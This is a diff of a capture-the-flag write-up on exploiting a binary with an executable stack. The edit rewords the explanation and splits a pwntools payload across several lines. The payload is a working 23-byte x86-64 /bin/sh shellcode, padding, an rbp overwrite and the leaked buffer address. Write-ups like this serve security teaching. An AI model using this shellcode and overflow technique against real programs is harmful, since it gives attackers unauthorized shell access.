@@ -5,14 +5,14 @@
 So for this challenge there is no `print_flag` function :(  
 How are we going to do ?
 
-When we run `checksec challenge`  we get this:
+When we run `checksec` on the binary,  we get this:
 
 ![](./img/16.png)
 
 It says that the stack is executable!  
 An **executable stack** is a region of a memory that has permissions set to allow the execution of **machine code** directly from it.
 
-We have control over what we put in the `name` variable and we are given his address in memory.
+We have control over what we put in the `name` variable (which is on the stack) and we are given his address in memory.
 
 We need to:
 1. Write a **shellcode** in `name`
@@ -51,8 +51,10 @@ log.info(f"name_addr = {hex(name_addr)}")
 
 #/bin/sh shellcode of 23 bytes + 25 \x00 to fill name now 8*B to fill rbp and now write name_addr to run the shellcode at this address
 
-exploit = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" + b"\x00"*25 + b'B'*8 + p64(name_addr)
-
+exploit = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"  
+exploit += b"\x00"*25
+exploit += b'B'*8
+exploit += p64(name_addr)
 # Send exploit
 conn.sendline(exploit)
 
